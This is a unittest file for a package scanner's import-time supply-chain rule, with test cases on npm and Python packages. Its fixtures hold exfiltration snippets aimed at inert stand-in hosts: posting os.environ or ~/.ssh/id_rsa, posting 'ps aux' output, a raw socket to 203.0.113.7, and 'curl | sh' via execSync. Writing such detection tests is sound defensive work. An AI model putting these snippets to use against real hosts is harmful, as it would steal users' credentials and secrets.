"""Code that runs when a package is loaded gets a weaker install-script test.

install_script_risk (the environment or credentials sent over the network,
an exfiltration service, a download piped into a shell) ran on install-time
scripts only, so an import-time stealer — in the files an npm package's
main, bin or exports reach, or a wheel's x/__init__.py — was judged only by
the generic rules. Those files now get a weaker version, SC-IMPORT-RISK,
narrower because this is where ordinary SDK code lives: reading one
variable, listing variables with a prefix, contacting a cloud metadata
address or naming its own service must not count.

Rule set 2.17 grades by what no library does when it is loaded
(import_time_severity): the whole environment, a credential store or what
local commands print about the machine, sent anywhere; local data sent to a
data-capture service or to a hard-coded public IP address (a raw socket's
too); a download run through a shell — CRITICAL. What a binary's installer
does, a file downloaded and then run, stays MAJOR (WARN)
(tests/scanner/test_supply_chain_signals.py's ImportTimeGradingTests and
test_exfiltration_shapes.py have the rest).

Payloads are inert: hosts are .invalid, 192.0.2.x or 203.0.113.x (TEST-NET).
"""

import unittest

from lazaret.registry import repo
from tests.registry._review_support import (
    EXFIL_JS, hooks, issues, manifest, scan_npm, scan_sdist, scan_wheel)

WHEEL_META = {"x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"}
ENV_TO_COLLECTOR_PY = ("import os, json, urllib.request\n"
                       "urllib.request.urlopen('https://collector.invalid/c', "
                       "data=json.dumps(dict(os.environ)).encode())\n")
SSH_KEY_TO_HOST_PY = ("import os, requests\n"
                      "requests.post('https://keys.invalid/k', "
                      "data=open(os.path.expanduser('~/.ssh/id_rsa')).read())\n")
# 0.1.8: sent to a raw IP address instead (a credential file and an IP
# address: tests/scanner/test_exfiltration_shapes.py)
SSH_KEY_TO_IP_PY = SSH_KEY_TO_HOST_PY.replace("https://keys.invalid/k", "http://192.0.2.1/k")
PS_POSTED_PY = ("import subprocess, requests\nout = subprocess.check_output(['ps', 'aux'])\n"
                "requests.post('https://collector.invalid/p', data=out)\n")
HOST_TO_SOCKET_PY = ("import socket\ns = socket.socket()\ns.connect(('203.0.113.7', 4444))\n"
                     "s.send(socket.gethostname().encode())\n")
PS_POSTED_JS = ("const {execSync} = require('child_process');\nconst out = execSync('ps aux').toString();\n"
                "fetch('https://collector.invalid/p', {method: 'POST', body: out});\n")
HOST_TO_SOCKET_JS = ("const net = require('net'), os = require('os');\n"
                     "const s = net.connect(8443, '203.0.113.7', () => s.end(os.hostname()));\n")
DOWNLOAD_RUN_JS = ("const https = require('https'), fs = require('fs');\n"
                   "const {execFileSync} = require('child_process');\n"
                   "https.get('https://dl.example.invalid/tool', (r) => r.pipe(fs.createWriteStream('/tmp/tool'))\n"
                   "  .on('finish', () => execFileSync('/tmp/tool', ['--version'])));\n")

# Shapes of ordinary SDK and CLI code: none of these is a finding
SDK_JS = {
    "api client": ("const https = require('https');\n"
                   "const API_KEY = process.env.EXAMPLE_API_KEY;\n"
                   "function request(path, body) {\n"
                   "  const req = https.request({host: 'api.example.invalid', path, method: 'POST',\n"
                   "    headers: {Authorization: `Bearer ${API_KEY}`}});\n"
                   "  req.end(JSON.stringify(body));\n"
                   "}\nmodule.exports = {request};\n"),
    "prefixed settings": ("const settings = Object.fromEntries(Object.entries(process.env)\n"
                          "  .filter(([k]) => k.startsWith('EXAMPLE_')));\n"
                          "module.exports = () => fetch('https://api.example.invalid/v1/ping', "
                          "{headers: {'x-sdk': JSON.stringify(settings)}});\n"),
    "cloud metadata": ("const http = require('http');\n"
                       "const METADATA = 'http://169.254.169.254/latest/meta-data/iam/';\n"
                       "module.exports = (cb) => http.get(METADATA, cb);\n"),
    "bot api client": ("const https = require('https');\n"
                       "const BASE = 'https://api.telegram.org/bot';\n"
                       "module.exports = (token, method, payload) => https.request(BASE + token + '/' "
                       "+ method, {method: 'POST'}).end(JSON.stringify(payload));\n"),
    "install hint": ("console.log('Install the toolchain with: "
                     "curl -fsSL https://sh.example.invalid/install.sh | sh');\n"),
    "public key": ("const fs = require('fs'), os = require('os'), path = require('path');\n"
                   "const https = require('https');\n"
                   "const key = fs.readFileSync(path.join(os.homedir(), '.ssh/id_ed25519.pub'));\n"
                   "https.request({host: 'deploy.example.invalid', method: 'PUT'}).end(key);\n"),
}
SDK_PY = {
    "api client": ("import os\nimport requests\n"
                   "API_URL = os.environ.get('EXAMPLE_API_URL', 'https://api.example.invalid')\n"
                   "session = requests.Session()\n\ndef ping():\n"
                   "    return session.get(API_URL + '/ping', timeout=5)\n"),
    "subprocess env": ("import os, subprocess, urllib.request\n\ndef build(cmd):\n"
                       "    env = os.environ.copy()\n    env['EXAMPLE_MODE'] = '1'\n"
                       "    return subprocess.run(cmd, env=env, check=True)\n\n"
                       "def fetch(url, dest):\n    urllib.request.urlretrieve(url, dest)\n"),
    "env listing": ("import os\nimport httpx\n"
                    "OPTIONS = {k: v for k, v in os.environ.items() if k.startswith('EXAMPLE_')}\n"
                    "client = httpx.Client(base_url='https://api.example.invalid')\n"),
}


def import_risk(res):
    return [(i["file"], i["sev"]) for i in issues(res, "SC-IMPORT-RISK")]


class NpmImportTimeTests(unittest.TestCase):
    def test_a_file_main_reaches(self):
        res = scan_npm({"package.json": manifest(), "index.js": "require('./lib/telemetry');\n",
                        "lib/telemetry.js": EXFIL_JS})
        self.assertEqual(import_risk(res), [("lib/telemetry.js", "CRITICAL")])     # 2.17: the whole environment
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        hit = issues(res, "SC-IMPORT-RISK")[0]
        self.assertEqual(hit["line"], 3)                     # the line that sends it (0.1.8: the flow's end)
        self.assertIn("runs when the package is loaded", hit["msg"])

    def test_a_downloaded_file_run_stays_major(self):
        # what a binary's installer does when it is first used
        res = scan_npm({"package.json": manifest(main="dist/index.js"), "dist/index.js": DOWNLOAD_RUN_JS})
        self.assertEqual(import_risk(res), [("dist/index.js", "MAJOR")])
        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
        self.assertIn("downloads a file and then runs it", issues(res, "SC-IMPORT-RISK")[0]["msg"])

    def test_what_commands_print_sent_anywhere(self):
        # 2.17: no library posts `ps aux` when it is loaded
        res = scan_npm({"package.json": manifest(), "index.js": PS_POSTED_JS})
        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])
        self.assertIn("sends what local commands report about the machine over the network (ps)",
                      issues(res, "SC-IMPORT-RISK")[0]["msg"])

    def test_a_raw_socket_to_a_public_address(self):
        # 2.17: a raw socket's hard-coded public address is an IP address; a
        # private network's is a service on the user's own network
        res = scan_npm({"package.json": manifest(), "index.js": HOST_TO_SOCKET_JS})
        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])
        self.assertIn("sends the machine's user or host name to an IP address (203.0.113.7)",
                      issues(res, "SC-IMPORT-RISK")[0]["msg"])
        private = HOST_TO_SOCKET_JS.replace("203.0.113.7", "10.0.0.5")
        self.assertEqual(import_risk(scan_npm({"package.json": manifest(), "index.js": private})), [])
        for addr in ("127.0.0.1", "192.168.1.10", "172.20.0.3", "169.254.169.254", "100.64.0.1", "0.0.0.0", "239.1.2.3"):
            with self.subTest(addr):          # this machine, a LAN, link-local, carrier-grade NAT, multicast
                self.assertEqual(repo.import_time_risk(HOST_TO_SOCKET_JS.replace("203.0.113.7", addr)), ([], None))
        self.assertEqual(repo.import_time_risk(HOST_TO_SOCKET_PY.replace("203.0.113.7", "172.32.0.1"))[0],
                         ["sends the machine's user or host name to an IP address (172.32.0.1)"])

    def test_a_bin_reading_an_ssh_key(self):
        res = scan_npm({"package.json": manifest(bin={"x": "bin/x.js"}),
                        "bin/x.js": ("const fs = require('fs');\n"
                                     "const k = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');\n"
                                     "fetch('https://collector.invalid/k', {method: 'POST', body: k});\n")})
        self.assertEqual(import_risk(res), [("bin/x.js", "CRITICAL")])            # 2.17: a credential store

    def test_a_named_service_labels_a_send(self):
        # 0.1.8: a service a list names is where data goes, not a finding of
        # its own: the environment and a data-capture service's address
        # handed to a function the caller supplies is not a send the file
        # makes; sent by a request, it is CRITICAL
        text = ("const data = JSON.stringify(process.env);\n"
                "module.exports = (send) => send('https://webhook.site/00000000-0000-0000-0000-000000000000', data);\n")
        self.assertEqual(import_risk(scan_npm({"package.json": manifest(), "index.js": text})), [])
        res = scan_npm({"package.json": manifest(), "index.js": text.replace("(send) => send(", "() => fetch(")})
        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])
        self.assertIn("(webhook.site)", issues(res, "SC-IMPORT-RISK")[0]["msg"])

    def test_a_download_piped_into_a_shell_by_exec(self):
        res = scan_npm({"package.json": manifest(),
                        "index.js": ("const {execSync} = require('child_process');\n"
                                     "execSync('curl -s https://files.invalid/x.sh | sh');\n")})
        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])     # fetch-and-run
        self.assertIn("runs a downloaded script through a shell",
                      issues(res, "SC-IMPORT-RISK")[0]["msg"])

    def test_install_scripts_keep_their_own_test(self):
        res = scan_npm({"package.json": hooks(postinstall="node install.js"), "install.js": EXFIL_JS})
        self.assertEqual(import_risk(res), [])
        self.assertEqual(issues(res, "SC-INSTALL-HOOK")[0]["sev"], "CRITICAL")

    def test_ordinary_sdk_code_is_not_a_finding(self):
        for label, text in SDK_JS.items():
            with self.subTest(label):
                res = scan_npm({"package.json": manifest(), "index.js": text})
                self.assertEqual(import_risk(res), [])
                self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_unreached_files_are_not_import_time_code(self):
        res = scan_npm({"package.json": manifest(), "index.js": "module.exports = 1;\n",
                        "scripts/release.js": EXFIL_JS})
        self.assertEqual(import_risk(res), [])


class WheelImportTimeTests(unittest.TestCase):
    def test_top_level_packages_and_modules(self):
        for rel, text in (("x/__init__.py", ENV_TO_COLLECTOR_PY), ("evil.py", SSH_KEY_TO_HOST_PY),
                          ("x-1.0.data/purelib/y/__init__.py", ENV_TO_COLLECTOR_PY)):
            with self.subTest(rel=rel):
                res = scan_wheel({**WHEEL_META, rel: text})
                self.assertEqual(import_risk(res), [(rel, "CRITICAL")])
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        for label, text in (("to an IP address", SSH_KEY_TO_IP_PY), ("commands' output", PS_POSTED_PY),
                            ("a raw socket", HOST_TO_SOCKET_PY)):
            with self.subTest(label):
                res = scan_wheel({**WHEEL_META, "evil.py": text})
                self.assertEqual(import_risk(res), [("evil.py", "CRITICAL")])
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_deeper_modules_are_not_checked(self):
        res = scan_wheel({**WHEEL_META, "x/__init__.py": "", "x/util.py": ENV_TO_COLLECTOR_PY})
        self.assertEqual(import_risk(res), [])

    def test_ordinary_sdk_code_is_not_a_finding(self):
        for label, text in SDK_PY.items():
            with self.subTest(label):
                res = scan_wheel({**WHEEL_META, "x/__init__.py": text})
                self.assertEqual(import_risk(res), [])
                self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_start_up_modules_keep_their_own_test(self):
        res = scan_wheel({**WHEEL_META, "sitecustomize.py": ENV_TO_COLLECTOR_PY})
        self.assertEqual(import_risk(res), [])
        self.assertEqual([i["sev"] for i in issues(res, "SC-SITECUSTOMIZE")], ["CRITICAL"])

    def test_an_sdists_modules_get_the_test_too(self):
        # an sdist's package runs when it is imported, like a wheel's (0.1.7:
        # it used to be judged by its install scripts alone)
        res = scan_sdist({"setup.py": "from setuptools import setup\nsetup(name='x')\n",
                          "x/__init__.py": ENV_TO_COLLECTOR_PY, "tests/test_x.py": ENV_TO_COLLECTOR_PY})
        self.assertEqual(import_risk(res), [("x/__init__.py", "CRITICAL")])


class WeakerThanTheInstallTestTests(unittest.TestCase):
    def test_what_only_the_install_test_counts(self):
        # an address that is a raw IP (the cloud's metadata service), a file
        # outside the package sent (a public key)
        for text in (SDK_JS["cloud metadata"], SDK_JS["public key"]):
            with self.subTest(text=text[:40]):
                self.assertTrue(repo.install_script_risk(text))
                self.assertEqual(repo.import_time_risk(text), ([], None))

    def test_what_neither_counts(self):
        # 0.1.8: the install test reads what is sent, not what a file names —
        # a bot API's address (a list's service: a label on a send), the
        # environment copied for a child process or listed by a prefix next
        # to a network call, the variables a prefix selects sent
        for text in (SDK_JS["prefixed settings"], SDK_JS["bot api client"], SDK_PY["subprocess env"],
                     SDK_PY["env listing"]):
            with self.subTest(text=text[:40]):
                self.assertEqual(repo.install_script_risk(text), [])
                self.assertEqual(repo.import_time_risk(text), ([], None))


if __name__ == "__main__":
    unittest.main()
